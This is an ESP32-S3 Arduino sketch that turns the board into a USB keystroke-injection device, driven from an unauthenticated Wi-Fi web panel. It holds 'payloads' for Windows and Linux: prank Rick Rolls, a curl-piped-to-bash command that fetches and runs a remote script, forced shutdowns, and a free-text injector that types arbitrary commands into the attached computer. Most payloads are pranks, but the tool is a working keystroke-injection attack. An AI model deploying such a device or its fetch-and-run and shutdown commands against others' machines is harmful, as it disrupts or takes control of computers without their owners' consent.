#include <WiFi.h>
#include <WebServer.h>
#include <Adafruit_NeoPixel.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

// --- Hardware Setup ---
#define RGB_PIN        48    // Adjust pin if your onboard LED uses 38 or 21
#define NUMPIXELS       1
const char* AP_SSID = "ESP32-S3 Command Center";

Adafruit_NeoPixel rgbLed(NUMPIXELS, RGB_PIN, NEO_GRB + NEO_KHZ800);
WebServer server(80);
USBHIDKeyboard Keyboard;

// --- Functional RGB Helper ---
void setRGBColor(uint8_t r, uint8_t g, uint8_t b) {
  rgbLed.setPixelColor(0, rgbLed.Color(r, g, b));
  rgbLed.show();
}

// --- HID Common Helpers ---
void openTerminalLinux() {
  // Common shortcut to open Terminal in Ubuntu/Debian/GNOME desktop
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(800); // Wait for terminal instance to open
}

void openRunMenuWindows() {
  Keyboard.press(KEY_LEFT_GUI); // Windows Key
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500); // Wait for Run dialog to appear
}

// --- Windows Payload Functions ---

void payloadRickRollWindows() {
  setRGBColor(255, 0, 255);
  openRunMenuWindows();
  Keyboard.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  Keyboard.write(KEY_RETURN);
}

void payloadCMatrixWindows() {
  setRGBColor(0, 255, 255);
  openRunMenuWindows();
  Keyboard.print("cmd");
  Keyboard.write(KEY_RETURN);
  delay(600);
  Keyboard.print("color 0a && cls && echo Initializing Matrix... && timeout 2 > nul && tree c:\\");
  Keyboard.write(KEY_RETURN);
}

void payloadVolumeUpWindows() {
  setRGBColor(0, 255, 0);
  for(int i = 0; i < 10; i++) {
    Keyboard.press(HID_KEY_VOLUME_UP);
    delay(50);
    Keyboard.release(HID_KEY_VOLUME_UP);
  }
}

void payloadShutdownWindows() {
  setRGBColor(255, 0, 0);
  openRunMenuWindows();
  Keyboard.print("shutdown /s /t 60 /c \"ESP32-S3 Power Down!\"");
  Keyboard.write(KEY_RETURN);
}

void payloadMsinfoWindows() {
  setRGBColor(0, 0, 255);
  openRunMenuWindows();
  Keyboard.print("msinfo32");
  Keyboard.write(KEY_RETURN);
}

void payloadSettingsWindows() {
  setRGBColor(255, 255, 0);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('i');
  delay(100);
  Keyboard.releaseAll();
}

// --- Linux Payload Functions ---

void payloadRickRollLinux() {
  setRGBColor(255, 0, 255);
  openTerminalLinux();
  Keyboard.print("xdg-open https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  Keyboard.write(KEY_RETURN);
}

void payloadRickRollAsciiLinux() {
  setRGBColor(255, 0, 255);
  openTerminalLinux();
  Keyboard.print("curl -sL https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash");
  Keyboard.write(KEY_RETURN);
}

void payloadCMatrixLinux() {
  setRGBColor(0, 255, 255);
  openTerminalLinux();
  Keyboard.print("cmatrix || (sudo apt-get install cmatrix -y && cmatrix)");
  Keyboard.write(KEY_RETURN);
}

void payloadVolumeUpLinux() {
  setRGBColor(0, 255, 0);
  for(int i = 0; i < 10; i++) {
    Keyboard.press(HID_KEY_VOLUME_UP);
    delay(50);
    Keyboard.release(HID_KEY_VOLUME_UP);
  }
}

void payloadShutdownLinux() {
  setRGBColor(255, 0, 0);
  openTerminalLinux();
  Keyboard.print("shutdown -h now");
  Keyboard.write(KEY_RETURN);
}

void payloadSettingsLinux() {
  setRGBColor(255, 255, 0);
  openTerminalLinux();
  Keyboard.print("gnome-control-center");
  Keyboard.write(KEY_RETURN);
}

// --- HTML Web Interface ---
const char* CONTROL_PANEL_HTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>HID Command Deck</title>
  <style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #121216; color: #fff; margin: 0; padding: 20px; }
    .deck { max-width: 500px; margin: auto; padding: 20px; background: #1e1e24; border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.5); }
    h1 { color: #00ffcc; margin-bottom: 5px; font-size: 22px; }
    h2 { color: #ffaa00; border-bottom: 1px solid #333; padding-bottom: 5px; margin-top: 25px; font-size: 18px; }
    .btn { display: inline-block; width: 90%; margin: 6px 0; padding: 12px; font-size: 14px; font-weight: bold; color: #fff; border: none; border-radius: 6px; cursor: pointer; text-decoration: none; box-sizing: border-box; }
    .btn-grid { display: flex; flex-wrap: wrap; justify-content: space-around; gap: 8px; }
    .btn-grid .btn { width: 45%; }
    .btn-key { background: #3a3a4c; }
    .btn-rick { background: #ff007f; }
    .btn-matrix { background: #28a745; }
    .btn-vol { background: #17a2b8; }
    .btn-down { background: #dc3545; }
    .btn-util { background: #6c757d; }
    .btn:active { transform: scale(0.97); filter: brightness(1.2); }
    .input-box { width: 90%; padding: 12px; margin: 10px 0; font-size: 15px; border-radius: 6px; border: 1px solid #444; background: #2a2a35; color: #fff; box-sizing: border-box; }
    .send-btn { background: #00ffcc; color: #000; font-weight: bold; width: 90%; }
  </style>
</head>
<body>
  <div class='deck'>
    <h1>🛸 ESP32-S3 HID Control Deck</h1>
    
    <!-- Custom Text Injection -->
    <h2>⌨️ Custom Text Injector</h2>
    <form action='/sendtext' method='POST'>
      <input type='text' name='text' class='input-box' placeholder='Type text to inject...' required autocomplete='off'>
      <button type='submit' class='btn send-btn'>Send Keystrokes</button>
    </form>

    <!-- Key Triggers -->
    <h2>🔘 Quick Keys</h2>
    <div class='btn-grid'>
      <a href='/key/win' class='btn btn-key'>GUI / Win Key</a>
      <a href='/key/enter' class='btn btn-key'>Enter</a>
      <a href='/key/tab' class='btn btn-key'>Tab</a>
      <a href='/key/backspace' class='btn btn-key'>Backspace</a>
      <a href='/key/esc' class='btn btn-key'>Escape</a>
      <a href='/key/space' class='btn btn-key'>Space</a>
    </div>

    <!-- Windows Payloads -->
    <h2>🪟 Windows Payloads</h2>
    <div class='btn-grid'>
      <a href='/win/rick' class='btn btn-rick'>Rick Roll</a>
      <a href='/win/matrix' class='btn btn-matrix'>Deploy Matrix</a>
      <a href='/win/volume' class='btn btn-vol'>Volume Up</a>
      <a href='/win/settings' class='btn btn-util'>Settings</a>
      <a href='/win/msinfo' class='btn btn-util'>MSInfo32</a>
      <a href='/win/shutdown' class='btn btn-down'>Shutdown (60s)</a>
    </div>

    <!-- Linux Payloads -->
    <h2>🐧 Linux Payloads</h2>
    <div class='btn-grid'>
      <a href='/lin/rick' class='btn btn-rick'>Rick Roll (Web)</a>
      <a href='/lin/rickascii' class='btn btn-rick'>Rick Roll (ASCII)</a>
      <a href='/lin/matrix' class='btn btn-matrix'>Deploy CMatrix</a>
      <a href='/lin/volume' class='btn btn-vol'>Volume Up</a>
      <a href='/lin/settings' class='btn btn-util'>Settings</a>
      <a href='/lin/shutdown' class='btn btn-down'>Shutdown</a>
    </div>

  </div>
</body>
</html>
)rawliteral";

// --- HTTP Request Handlers ---

void handleRoot() {
  server.send(200, "text/html", CONTROL_PANEL_HTML);
}

void handleSendText() {
  if (server.hasArg("text")) {
    String textToInject = server.arg("text");
    setRGBColor(255, 255, 255);
    Keyboard.print(textToInject);
  }
  // Redirect back to main page after submitting
  server.sendHeader("Location", "/");
  server.send(303);
}

void setup() {
  rgbLed.begin();
  setRGBColor(150, 75, 0); // Startup Amber

  USB.begin();
  Keyboard.begin();

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);

  // Main UI Endpoint
  server.on("/", HTTP_GET, handleRoot);
  server.on("/sendtext", HTTP_POST, handleSendText);

  // Single Key Endpoints
  server.on("/key/win", HTTP_GET, []() {
    Keyboard.press(KEY_LEFT_GUI); delay(100); Keyboard.releaseAll();
    server.sendHeader("Location", "/"); server.send(303);
  });
  server.on("/key/enter", HTTP_GET, []() {
    Keyboard.write(KEY_RETURN);
    server.sendHeader("Location", "/"); server.send(303);
  });
  server.on("/key/tab", HTTP_GET, []() {
    Keyboard.write(KEY_TAB);
    server.sendHeader("Location", "/"); server.send(303);
  });
  server.on("/key/backspace", HTTP_GET, []() {
    Keyboard.write(KEY_BACKSPACE);
    server.sendHeader("Location", "/"); server.send(303);
  });
  server.on("/key/esc", HTTP_GET, []() {
    Keyboard.write(KEY_ESC);
    server.sendHeader("Location", "/"); server.send(303);
  });
  server.on("/key/space", HTTP_GET, []() {
    Keyboard.write(' ');
    server.sendHeader("Location", "/"); server.send(303);
  });

  // Windows Endpoints
  server.on("/win/rick", HTTP_GET, []() { payloadRickRollWindows(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/win/matrix", HTTP_GET, []() { payloadCMatrixWindows(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/win/volume", HTTP_GET, []() { payloadVolumeUpWindows(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/win/shutdown", HTTP_GET, []() { payloadShutdownWindows(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/win/msinfo", HTTP_GET, []() { payloadMsinfoWindows(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/win/settings", HTTP_GET, []() { payloadSettingsWindows(); server.sendHeader("Location", "/"); server.send(303); });

  // Linux Endpoints
  server.on("/lin/rick", HTTP_GET, []() { payloadRickRollLinux(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/lin/rickascii", HTTP_GET, []() { payloadRickRollAsciiLinux(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/lin/matrix", HTTP_GET, []() { payloadCMatrixLinux(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/lin/volume", HTTP_GET, []() { payloadVolumeUpLinux(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/lin/shutdown", HTTP_GET, []() { payloadShutdownLinux(); server.sendHeader("Location", "/"); server.send(303); });
  server.on("/lin/settings", HTTP_GET, []() { payloadSettingsLinux(); server.sendHeader("Location", "/"); server.send(303); });

  server.begin();
  setRGBColor(0, 0, 80); // Ready Status
}

void loop() {
  server.handleClient();

  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 2000) {
    lastUpdate = millis();
    int clients = WiFi.softAPgetStationNum();
    if (clients == 0) {
      setRGBColor(0, 0, 80);  // Waiting mode (Blue)
    } else {
      setRGBColor(0, 80, 0);  // Client connected (Green)
    }
  }
}